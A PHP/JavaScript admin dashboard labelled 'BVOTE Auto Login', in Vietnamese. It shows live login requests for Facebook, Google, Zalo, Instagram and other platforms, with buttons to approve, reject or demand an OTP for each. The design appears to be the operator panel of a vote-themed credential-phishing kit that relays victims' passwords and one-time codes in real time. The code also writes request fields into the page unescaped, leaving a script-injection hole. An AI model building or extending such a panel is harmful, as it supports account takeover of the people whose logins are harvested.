<?php
/**
 * Realtime Admin Dashboard - BVOTE
 * Dashboard admin với cập nhật realtime cho Auto Login
 */
?>
<div id="realtime-admin-dashboard" class="bg-white rounded-lg shadow-lg p-6">
    <!-- Header -->
    <div class="flex items-center justify-between mb-6">
        <div>
            <h2 class="text-2xl font-bold text-gray-900">Auto Login Dashboard</h2>
            <p class="text-gray-600">Quản lý yêu cầu đăng nhập tự động với cập nhật realtime</p>
        </div>
        <div class="flex items-center space-x-3">
            <div class="flex items-center space-x-2">
                <div class="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                <span class="text-sm text-gray-600" id="connection-status">Đang kết nối</span>
            </div>
            <button onclick="refreshRealtimeData()" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition-colors">
                <i class="fas fa-sync-alt mr-2"></i>Làm mới
            </button>
        </div>
    </div>

    <!-- Stats Cards -->
    <div class="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
        <!-- Pending Requests -->
        <div class="bg-gradient-to-r from-yellow-400 to-yellow-500 rounded-lg p-6 text-white">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-yellow-100 text-sm font-medium">Chờ phê duyệt</p>
                    <p class="text-3xl font-bold" id="stats-pending">0</p>
                </div>
                <div class="w-12 h-12 bg-white bg-opacity-20 rounded-full flex items-center justify-center">
                    <i class="fas fa-clock text-2xl"></i>
                </div>
            </div>
            <div class="mt-4">
                <span class="text-yellow-100 text-sm" id="stats-pending-change">+0 hôm nay</span>
            </div>
        </div>

        <!-- OTP Required -->
        <div class="bg-gradient-to-r from-orange-400 to-orange-500 rounded-lg p-6 text-white">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-orange-100 text-sm font-medium">Cần OTP</p>
                    <p class="text-3xl font-bold" id="stats-otp">0</p>
                </div>
                <div class="w-12 h-12 bg-white bg-opacity-20 rounded-full flex items-center justify-center">
                    <i class="fas fa-key text-2xl"></i>
                </div>
            </div>
            <div class="mt-4">
                <span class="text-orange-100 text-sm" id="stats-otp-change">+0 hôm nay</span>
            </div>
        </div>

        <!-- Approved -->
        <div class="bg-gradient-to-r from-green-400 to-green-500 rounded-lg p-6 text-white">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-green-100 text-sm font-medium">Đã duyệt</p>
                    <p class="text-3xl font-bold" id="stats-approved">0</p>
                </div>
                <div class="w-12 h-12 bg-white bg-opacity-20 rounded-full flex items-center justify-center">
                    <i class="fas fa-check text-2xl"></i>
                </div>
            </div>
            <div class="mt-4">
                <span class="text-green-100 text-sm" id="stats-approved-change">+0 hôm nay</span>
            </div>
        </div>

        <!-- Rejected -->
        <div class="bg-gradient-to-r from-red-400 to-red-500 rounded-lg p-6 text-white">
            <div class="flex items-center justify-between">
                <div>
                    <p class="text-red-100 text-sm font-medium">Bị từ chối</p>
                    <p class="text-3xl font-bold" id="stats-rejected">0</p>
                </div>
                <div class="w-12 h-12 bg-white bg-opacity-20 rounded-full flex items-center justify-center">
                    <i class="fas fa-times text-2xl"></i>
                </div>
            </div>
            <div class="mt-4">
                <span class="text-red-100 text-sm" id="stats-rejected-change">+0 hôm nay</span>
            </div>
        </div>
    </div>

    <!-- Real-time Activity Feed -->
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <!-- Live Activity -->
        <div class="bg-gray-50 rounded-lg p-6">
            <h3 class="text-lg font-semibold text-gray-900 mb-4 flex items-center">
                <i class="fas fa-broadcast-tower text-blue-600 mr-2"></i>
                Hoạt động trực tiếp
                <div class="ml-2 w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
            </h3>
            <div class="space-y-3 max-h-96 overflow-y-auto" id="live-activity-feed">
                <!-- Activity items will be added here -->
            </div>
        </div>

        <!-- Platform Distribution -->
        <div class="bg-gray-50 rounded-lg p-6">
            <h3 class="text-lg font-semibold text-gray-900 mb-4">
                <i class="fas fa-chart-pie text-blue-600 mr-2"></i>
                Phân bố nền tảng
            </h3>
            <div class="space-y-3" id="platform-distribution">
                <!-- Platform stats will be added here -->
            </div>
        </div>
    </div>

    <!-- Recent Requests Table -->
    <div class="mt-8">
        <div class="flex items-center justify-between mb-4">
            <h3 class="text-lg font-semibold text-gray-900">
                <i class="fas fa-list text-blue-600 mr-2"></i>
                Yêu cầu gần đây
            </h3>
            <div class="flex items-center space-x-2">
                <select id="filter-status" class="border border-gray-300 rounded-lg px-3 py-2 text-sm">
                    <option value="">Tất cả trạng thái</option>
                    <option value="PENDING_REVIEW">Chờ duyệt</option>
                    <option value="OTP_REQUIRED">Cần OTP</option>
                    <option value="APPROVED">Đã duyệt</option>
                    <option value="REJECTED">Bị từ chối</option>
                    <option value="EXPIRED">Hết hạn</option>
                </select>
                <select id="filter-platform" class="border border-gray-300 rounded-lg px-3 py-2 text-sm">
                    <option value="">Tất cả nền tảng</option>
                    <option value="facebook">Facebook</option>
                    <option value="google">Google</option>
                    <option value="instagram">Instagram</option>
                    <option value="zalo">Zalo</option>
                    <option value="yahoo">Yahoo</option>
                    <option value="microsoft">Microsoft</option>
                    <option value="email">Email</option>
                </select>
            </div>
        </div>

        <div class="bg-white border border-gray-200 rounded-lg overflow-hidden">
            <div class="overflow-x-auto">
                <table class="min-w-full divide-y divide-gray-200">
                    <thead class="bg-gray-50">
                        <tr>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                Thông tin
                            </th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                Nền tảng
                            </th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                Trạng thái
                            </th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                Thời gian
                            </th>
                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                Hành động
                            </th>
                        </tr>
                    </thead>
                    <tbody class="bg-white divide-y divide-gray-200" id="recent-requests-table">
                        <!-- Table rows will be added here -->
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<script>
class RealtimeAdminDashboard {
    constructor() {
        this.connectionStatus = 'connected';
        this.lastUpdate = null;
        this.updateInterval = null;
        this.websocket = null;
        this.stats = {
            pending: 0,
            otp: 0,
            approved: 0,
            rejected: 0,
            pendingChange: 0,
            otpChange: 0,
            approvedChange: 0,
            rejectedChange: 0
        };
        this.platformStats = {};
        this.recentRequests = [];
        this.activityFeed = [];

        this.init();
    }

    init() {
        this.setupEventListeners();
        this.startRealtimeUpdates();
        this.loadInitialData();
    }

    setupEventListeners() {
        // Filter change handlers
        document.getElementById('filter-status').addEventListener('change', () => this.filterRequests());
        document.getElementById('filter-platform').addEventListener('change', () => this.filterRequests());
    }

    startRealtimeUpdates() {
        // Update every 5 seconds
        this.updateInterval = setInterval(() => {
            this.updateDashboard();
        }, 5000);

        // Try to establish WebSocket connection
        this.setupWebSocket();
    }

    setupWebSocket() {
        try {
            // Check if WebSocket is supported
            if ('WebSocket' in window) {
                const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
                const wsUrl = `${protocol}//${window.location.host}/ws/admin-dashboard`;

                this.websocket = new WebSocket(wsUrl);

                this.websocket.onopen = () => {
                    this.connectionStatus = 'connected';
                    this.updateConnectionStatus();
                };

                this.websocket.onmessage = (event) => {
                    const data = JSON.parse(event.data);
                    this.handleWebSocketMessage(data);
                };

                this.websocket.onclose = () => {
                    this.connectionStatus = 'disconnected';
                    this.updateConnectionStatus();
                    // Fallback to polling
                    this.startPollingFallback();
                };

                this.websocket.onerror = () => {
                    this.connectionStatus = 'error';
                    this.updateConnectionStatus();
                    // Fallback to polling
                    this.startPollingFallback();
                };
            } else {
                // Fallback to polling if WebSocket not supported
                this.startPollingFallback();
            }
        } catch (error) {
            console.error('WebSocket setup failed:', error);
            this.startPollingFallback();
        }
    }

    startPollingFallback() {
        console.log('Using polling fallback for realtime updates');
        // Polling is already active via updateInterval
    }

    handleWebSocketMessage(data) {
        switch (data.type) {
            case 'stats_update':
                this.updateStats(data.stats);
                break;
            case 'new_request':
                this.addNewRequest(data.request);
                this.addActivityItem('new_request', data.request);
                break;
            case 'status_change':
                this.updateRequestStatus(data.request_id, data.new_status);
                this.addActivityItem('status_change', data);
                break;
            case 'platform_update':
                this.updatePlatformStats(data.platform_stats);
                break;
        }
    }

    async loadInitialData() {
        try {
            const [statsResponse, requestsResponse, platformResponse] = await Promise.all([
                fetch('/api/admin/auth/stats'),
                fetch('/api/admin/auth/requests?limit=10'),
                fetch('/api/admin/auth/platform-stats')
            ]);

            if (statsResponse.ok) {
                const statsData = await statsResponse.json();
                this.updateStats(statsData.stats);
            }

            if (requestsResponse.ok) {
                const requestsData = await requestsResponse.json();
                this.recentRequests = requestsData.requests || [];
                this.renderRecentRequests();
            }

            if (platformResponse.ok) {
                const platformData = await platformResponse.json();
                this.updatePlatformStats(platformData.platform_stats);
            }
        } catch (error) {
            console.error('Failed to load initial data:', error);
        }
    }

    async updateDashboard() {
        try {
            const response = await fetch('/api/admin/auth/dashboard-update');
            if (response.ok) {
                const data = await response.json();
                this.updateStats(data.stats);
                this.updatePlatformStats(data.platform_stats);

                // Check for new requests
                if (data.new_requests && data.new_requests.length > 0) {
                    data.new_requests.forEach(request => {
                        this.addNewRequest(request);
                        this.addActivityItem('new_request', request);
                    });
                }
            }
        } catch (error) {
            console.error('Dashboard update failed:', error);
        }
    }

    updateStats(newStats) {
        this.stats = { ...this.stats, ...newStats };

        // Update UI
        document.getElementById('stats-pending').textContent = this.stats.pending || 0;
        document.getElementById('stats-otp').textContent = this.stats.otp || 0;
        document.getElementById('stats-approved').textContent = this.stats.approved || 0;
        document.getElementById('stats-rejected').textContent = this.stats.rejected || 0;

        document.getElementById('stats-pending-change').textContent =
            `${this.stats.pendingChange >= 0 ? '+' : ''}${this.stats.pendingChange} hôm nay`;
        document.getElementById('stats-otp-change').textContent =
            `${this.stats.otpChange >= 0 ? '+' : ''}${this.stats.otpChange} hôm nay`;
        document.getElementById('stats-approved-change').textContent =
            `${this.stats.approvedChange >= 0 ? '+' : ''}${this.stats.approvedChange} hôm nay`;
        document.getElementById('stats-rejected-change').textContent =
            `${this.stats.rejectedChange >= 0 ? '+' : ''}${this.stats.rejectedChange} hôm nay`;
    }

    updatePlatformStats(platformStats) {
        this.platformStats = platformStats;
        this.renderPlatformDistribution();
    }

    addNewRequest(request) {
        this.recentRequests.unshift(request);
        if (this.recentRequests.length > 20) {
            this.recentRequests = this.recentRequests.slice(0, 20);
        }
        this.renderRecentRequests();
    }

    updateRequestStatus(requestId, newStatus) {
        const request = this.recentRequests.find(r => r.id === requestId);
        if (request) {
            request.status = newStatus;
            request.updated_at = new Date().toISOString();
            this.renderRecentRequests();
        }
    }

    addActivityItem(type, data) {
        const activityItem = {
            id: Date.now(),
            type: type,
            data: data,
            timestamp: new Date(),
            message: this.generateActivityMessage(type, data)
        };

        this.activityFeed.unshift(activityItem);
        if (this.activityFeed.length > 50) {
            this.activityFeed = this.activityFeed.slice(0, 50);
        }

        this.renderActivityFeed();
    }

    generateActivityMessage(type, data) {
        switch (type) {
            case 'new_request':
                return `Yêu cầu mới từ ${data.platform}: ${data.user_hint}`;
            case 'status_change':
                return `Trạng thái thay đổi: ${data.request_id} → ${data.new_status}`;
            default:
                return 'Hoạt động mới';
        }
    }

    renderActivityFeed() {
        const container = document.getElementById('live-activity-feed');
        container.innerHTML = '';

        this.activityFeed.slice(0, 10).forEach(item => {
            const itemDiv = document.createElement('div');
            itemDiv.className = 'flex items-start space-x-3 p-3 bg-white rounded-lg border border-gray-200';

            const icon = this.getActivityIcon(item.type);
            const color = this.getActivityColor(item.type);

            itemDiv.innerHTML = `
                <div class="flex-shrink-0">
                    <div class="w-8 h-8 ${color} rounded-full flex items-center justify-center">
                        <i class="${icon} text-white text-sm"></i>
                    </div>
                </div>
                <div class="flex-1 min-w-0">
                    <p class="text-sm text-gray-900">${item.message}</p>
                    <p class="text-xs text-gray-500">${item.timestamp.toLocaleTimeString('vi-VN')}</p>
                </div>
            `;

            container.appendChild(itemDiv);
        });
    }

    renderPlatformDistribution() {
        const container = document.getElementById('platform-distribution');
        container.innerHTML = '';

        Object.entries(this.platformStats).forEach(([platform, count]) => {
            const percentage = this.stats.pending > 0 ? Math.round((count / this.stats.pending) * 100) : 0;

            const platformDiv = document.createElement('div');
            platformDiv.className = 'flex items-center justify-between p-3 bg-white rounded-lg border border-gray-200';

            platformDiv.innerHTML = `
                <div class="flex items-center space-x-3">
                    <div class="w-8 h-8 bg-blue-100 rounded-lg flex items-center justify-center">
                        <i class="fas fa-globe text-blue-600"></i>
                    </div>
                    <div>
                        <p class="text-sm font-medium text-gray-900">${this.getPlatformDisplayName(platform)}</p>
                        <p class="text-xs text-gray-500">${count} yêu cầu</p>
                    </div>
                </div>
                <div class="text-right">
                    <p class="text-sm font-semibold text-gray-900">${percentage}%</p>
                    <div class="w-16 bg-gray-200 rounded-full h-2">
                        <div class="bg-blue-600 h-2 rounded-full" style="width: ${percentage}%"></div>
                    </div>
                </div>
            `;

            container.appendChild(platformDiv);
        });
    }

    renderRecentRequests() {
        const container = document.getElementById('recent-requests-table');
        container.innerHTML = '';

        this.recentRequests.forEach(request => {
            const row = document.createElement('tr');
            row.className = 'hover:bg-gray-50';

            row.innerHTML = `
                <td class="px-6 py-4 whitespace-nowrap">
                    <div class="flex items-center">
                        <div class="flex-shrink-0 h-10 w-10">
                            <div class="h-10 w-10 rounded-full bg-gray-300 flex items-center justify-center">
                                <i class="fas fa-user text-gray-600"></i>
                            </div>
                        </div>
                        <div class="ml-4">
                            <div class="text-sm font-medium text-gray-900">${request.user_hint}</div>
                            <div class="text-sm text-gray-500">ID: ${request.request_id}</div>
                        </div>
                    </div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap">
                    <div class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-blue-100 text-blue-800">
                        <i class="fas fa-globe mr-1"></i>
                        ${this.getPlatformDisplayName(request.platform)}
                    </div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap">
                    <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium ${this.getStatusBadgeClass(request.status)}">
                        ${this.getStatusBadgeText(request.status)}
                    </span>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                    <div>${new Date(request.created_at).toLocaleDateString('vi-VN')}</div>
                    <div>${new Date(request.created_at).toLocaleTimeString('vi-VN')}</div>
                </td>
                <td class="px-6 py-4 whitespace-nowrap text-sm font-medium">
                    <div class="flex space-x-2">
                        ${this.getActionButtons(request)}
                    </div>
                </td>
            `;

            container.appendChild(row);
        });
    }

    getActionButtons(request) {
        let buttons = '';

        if (request.status === 'PENDING_REVIEW') {
            buttons += `
                <button onclick="approveRequest('${request.request_id}')" class="text-green-600 hover:text-green-900">
                    <i class="fas fa-check"></i>
                </button>
                <button onclick="rejectRequest('${request.request_id}')" class="text-red-600 hover:text-red-900">
                    <i class="fas fa-times"></i>
                </button>
                <button onclick="requireOtp('${request.request_id}')" class="text-yellow-600 hover:text-yellow-900">
                    <i class="fas fa-key"></i>
                </button>
            `;
        } else if (request.status === 'OTP_REQUIRED') {
            buttons += `
                <button onclick="viewOtpStatus('${request.request_id}')" class="text-blue-600 hover:text-blue-900">
                    <i class="fas fa-eye"></i>
                </button>
            `;
        }

        return buttons;
    }

    filterRequests() {
        const statusFilter = document.getElementById('filter-status').value;
        const platformFilter = document.getElementById('filter-platform').value;

        // Implement filtering logic here
        // This would typically involve making an API call with filters
        console.log('Filtering requests:', { status: statusFilter, platform: platformFilter });
    }

    updateConnectionStatus() {
        const statusElement = document.getElementById('connection-status');
        const indicator = statusElement.previousElementSibling;

        switch (this.connectionStatus) {
            case 'connected':
                statusElement.textContent = 'Đang kết nối';
                indicator.className = 'w-3 h-3 bg-green-500 rounded-full animate-pulse';
                break;
            case 'disconnected':
                statusElement.textContent = 'Mất kết nối';
                indicator.className = 'w-3 h-3 bg-red-500 rounded-full';
                break;
            case 'error':
                statusElement.textContent = 'Lỗi kết nối';
                indicator.className = 'w-3 h-3 bg-red-500 rounded-full';
                break;
        }
    }

    getActivityIcon(type) {
        const icons = {
            'new_request': 'fas fa-plus',
            'status_change': 'fas fa-exchange-alt',
            'otp_required': 'fas fa-key',
            'approved': 'fas fa-check',
            'rejected': 'fas fa-times'
        };
        return icons[type] || 'fas fa-info-circle';
    }

    getActivityColor(type) {
        const colors = {
            'new_request': 'bg-blue-500',
            'status_change': 'bg-yellow-500',
            'otp_required': 'bg-orange-500',
            'approved': 'bg-green-500',
            'rejected': 'bg-red-500'
        };
        return colors[type] || 'bg-gray-500';
    }

    getPlatformDisplayName(platform) {
        const names = {
            'facebook': 'Facebook',
            'google': 'Google',
            'instagram': 'Instagram',
            'zalo': 'Zalo',
            'yahoo': 'Yahoo',
            'microsoft': 'Microsoft',
            'outlook': 'Outlook',
            'email': 'Email',
            'apple': 'Apple'
        };
        return names[platform] || platform;
    }

    getStatusBadgeText(status) {
        const texts = {
            'PENDING_REVIEW': 'Chờ duyệt',
            'OTP_REQUIRED': 'Cần OTP',
            'APPROVED': 'Đã duyệt',
            'REJECTED': 'Bị từ chối',
            'EXPIRED': 'Hết hạn'
        };
        return texts[status] || status;
    }

    getStatusBadgeClass(status) {
        const classes = {
            'PENDING_REVIEW': 'bg-yellow-100 text-yellow-800',
            'OTP_REQUIRED': 'bg-orange-100 text-orange-800',
            'APPROVED': 'bg-green-100 text-green-800',
            'REJECTED': 'bg-red-100 text-red-800',
            'EXPIRED': 'bg-gray-100 text-gray-800'
        };
        return classes[status] || 'bg-gray-100 text-gray-800';
    }

    destroy() {
        if (this.updateInterval) {
            clearInterval(this.updateInterval);
        }
        if (this.websocket) {
            this.websocket.close();
        }
    }
}

// Global instance
window.realtimeAdminDashboard = new RealtimeAdminDashboard();

// Global functions
function refreshRealtimeData() {
    if (window.realtimeAdminDashboard) {
        window.realtimeAdminDashboard.loadInitialData();
    }
}

function approveRequest(requestId) {
    // Implement approve logic
    console.log('Approving request:', requestId);
}

function rejectRequest(requestId) {
    // Implement reject logic
    console.log('Rejecting request:', requestId);
}

function requireOtp(requestId) {
    // Implement OTP requirement logic
    console.log('Requiring OTP for request:', requestId);
}

function viewOtpStatus(requestId) {
    // Implement OTP status view logic
    console.log('Viewing OTP status for request:', requestId);
}
</script>
